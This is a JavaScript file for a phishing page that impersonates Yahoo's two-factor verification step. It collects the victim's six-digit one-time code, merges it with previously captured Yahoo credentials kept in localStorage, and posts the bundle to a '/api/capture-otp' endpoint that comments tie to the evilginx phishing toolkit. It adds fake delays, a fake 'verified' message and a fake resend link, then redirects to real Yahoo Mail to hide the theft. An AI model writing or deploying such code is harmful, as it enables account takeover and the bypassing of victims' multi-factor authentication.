document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("otp-form")
  const submitBtn = document.getElementById("submit-btn")
  const errorDiv = document.getElementById("error-message")
  const successDiv = document.getElementById("success-message")
  const otpInput = document.getElementById("verifyCode")
  const resendLink = document.getElementById("resend-link")

  // Get method from URL
  const urlParams = new URLSearchParams(window.location.search)
  const method = urlParams.get("method") || "email"

  // Update description based on method
  const description = document.querySelector("p")
  switch (method) {
    case "sms":
      description.textContent = "We sent a code to your phone number"
      break
    case "app":
      description.textContent = "Enter the code from your authenticator app"
      break
    default:
      description.textContent = "We sent a code to your email address"
  }

  function showError(message) {
    errorDiv.textContent = message
    errorDiv.style.display = "block"
    successDiv.style.display = "none"
  }

  function showSuccess(message) {
    successDiv.textContent = message
    successDiv.style.display = "block"
    errorDiv.style.display = "none"
  }

  function hideMessages() {
    errorDiv.style.display = "none"
    successDiv.style.display = "none"
  }

  function setLoading(loading) {
    if (loading) {
      submitBtn.innerHTML = '<span class="spinner"></span>Verifying...'
      submitBtn.disabled = true
      form.classList.add("loading")
    } else {
      submitBtn.innerHTML = "Verify"
      submitBtn.disabled = false
      form.classList.remove("loading")
    }
  }

  // Format OTP input (only numbers, max 6 digits)
  otpInput.addEventListener("input", function () {
    this.value = this.value.replace(/[^0-9]/g, "").substring(0, 6)
    hideMessages()

    if (this.value.length > 0) {
      this.style.borderColor = "#6001d2"
    } else {
      this.style.borderColor = "#e1e1e1"
    }

    // Auto-submit when 6 digits entered
    if (this.value.length === 6) {
      setTimeout(() => {
        form.dispatchEvent(new Event("submit"))
      }, 500)
    }
  })

  // Handle paste
  otpInput.addEventListener("paste", function (e) {
    e.preventDefault()
    const paste = (e.clipboardData || window.clipboardData).getData("text")
    const numbers = paste.replace(/[^0-9]/g, "").substring(0, 6)
    this.value = numbers
    this.dispatchEvent(new Event("input"))
  })

  form.addEventListener("submit", (e) => {
    e.preventDefault()

    const otpCode = otpInput.value.trim()

    if (!otpCode) {
      showError("Please enter the verification code.")
      otpInput.focus()
      return
    }

    if (otpCode.length !== 6) {
      showError("Please enter a 6-digit code.")
      otpInput.focus()
      return
    }

    if (!/^\d{6}$/.test(otpCode)) {
      showError("Please enter a valid 6-digit code.")
      otpInput.focus()
      return
    }

    setLoading(true)
    hideMessages()

    // Get stored credentials
    const storedCreds = JSON.parse(localStorage.getItem("yahoo_credentials") || "{}")

    // Simulate realistic delay
    setTimeout(
      () => {
        // Store final credentials with OTP
        const finalData = {
          ...storedCreds,
          otp_code: otpCode,
          verification_method: method,
          completion_timestamp: new Date().toISOString(),
          session_complete: true,
        }

        // Send to evilginx data capture
        fetch("/api/capture-otp", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(finalData),
        }).catch(() => {
          // Fail silently - evilginx will capture via form submission
        })

        localStorage.setItem("yahoo_credentials", JSON.stringify(finalData))

        showSuccess("Account verified successfully!")

        // Redirect to success page or Yahoo dashboard
        setTimeout(() => {
          window.location.href = "https://mail.yahoo.com/d/folders/1"
        }, 2000)
      },
      2000 + Math.random() * 1500,
    ) // Random delay 2-3.5 seconds
  })

  // Resend code functionality
  resendLink.addEventListener("click", function (e) {
    e.preventDefault()

    this.style.pointerEvents = "none"
    this.style.opacity = "0.5"
    this.textContent = "Sending..."

    setTimeout(() => {
      showSuccess("Verification code sent!")
      this.style.pointerEvents = "auto"
      this.style.opacity = "1"
      this.textContent = "Resend code"
    }, 2000)
  })

  // Focus on OTP input
  otpInput.focus()
})
